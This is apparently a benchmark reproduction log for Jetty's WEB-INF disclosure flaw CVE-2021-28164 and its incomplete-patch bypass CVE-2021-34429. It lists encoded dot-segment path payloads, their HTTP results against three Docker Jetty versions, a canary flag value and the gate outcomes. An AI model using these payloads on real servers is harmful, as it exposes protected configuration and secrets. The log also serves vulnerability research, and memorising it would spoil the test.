# repro.log — jetty-uri-canonicalize-before-authz-webinf (CVE-2021-28164 -> CVE-2021-34429)
# generated: 2026-07-14 (real Docker, official jetty:9.4.x-jre8 images, linux/amd64 emulation)
# per-run canary token planted at ROOT webapp WEB-INF/pcb-secret.txt by the compose
# entrypoint from $PCB_FLAG. Gate run flag: PCBFLAG_6b913192bdc956d8ab0b5561aeb9acd8

## Recipe bring-up (no committed images/WAR; official jetty tags pulled at up-time)
  PCB_FLAG=<token> docker compose --profile v0 --profile v1 --profile v2 up -d
  # entrypoint (sh /pcb-entrypoint.sh): materialises /var/lib/jetty/webapps/ROOT
  #   (index.html + WEB-INF/web.xml from /seed) and writes $PCB_FLAG ->
  #   WEB-INF/pcb-secret.txt, then execs the stock Jetty entrypoint.
  # oracle.py --run-gate does the whole up -> wait-ready -> gate -> down cycle.

## Payloads (sent with curl --path-as-is so the client does not normalize)
  plain    (protected, must deny)              : /WEB-INF/pcb-secret.txt
  original (CVE-2021-28164, %2e dot segment)   : /%2e/WEB-INF/pcb-secret.txt
  residual (CVE-2021-34429, %u002e Jetty %u)   : /%u002e/WEB-INF/pcb-secret.txt
  residual-alt (CVE-2021-34429, encoded null)  : /.%00/WEB-INF/pcb-secret.txt

## V0 = jetty:9.4.38-jre8 (port 39438) — vulnerable to CVE-2021-28164
  plain    /WEB-INF/pcb-secret.txt : HTTP 404  DENIED (WEB-INF protected)
  original %2e                     : HTTP 200  CANARY-HIT
  residual %u002e                  : HTTP 200  CANARY-HIT
  residual .%00                    : HTTP 200  CANARY-HIT

## V1 = jetty:9.4.39-jre8 (port 39439) — 28164 patched INCOMPLETELY (THE TARGET)
  plain    /WEB-INF/pcb-secret.txt : HTTP 404  DENIED
  original %2e                     : HTTP 404  blocked / no-canary   <- seed BLOCKED (differential precondition)
  residual %u002e                  : HTTP 200  CANARY-HIT            <- residual CONFIRMED (flag exfiltrated)
  residual .%00                    : HTTP 200  CANARY-HIT            <- alternate residual also open

## V2 = jetty:9.4.43-jre8 (port 39443) — CVE-2021-34429 fully fixed (negative)
  plain    /WEB-INF/pcb-secret.txt : HTTP 404  DENIED
  original %2e                     : HTTP 404  blocked / no-canary
  residual %u002e                  : HTTP 404  blocked / no-canary   <- residual CLOSED
  residual .%00                    : HTTP 400  rejected (ambiguous URI) <- residual CLOSED

## Build-time gate (benchmark/flag_oracle.validate_case via `python3 oracle.py --run-gate`)
  original_poc_reaches_flag_on_v0 : true
  original_poc_blocked_on_v1      : true
  bypass_poc_reaches_flag_on_v1   : true
  passed                          : true

## Fix evolution (advisory-derived)
  9.4.37 : URI parsing made RFC-compliant -> normalize BEFORE decode.
  9.4.39 : CVE-2021-28164 fix -> rejects plain %2e dot-segment reaching WEB-INF,
           but %u002e (%u-encoding) and encoded-null still decode to '.' -> bypass.
  9.4.43 : CVE-2021-34429 fix -> URIs first decoded THEN normalized; ambiguous
           segments (encoded dot/separator/empty/null) rejected as 400;
           ContextHandler.getResource requires normalized paths.

## Teardown
  PCB_FLAG=teardown docker compose --profile v0 --profile v1 --profile v2 down -v --rmi all
  docker image prune -f
  # verified: no jetty containers, no jetty images remain.

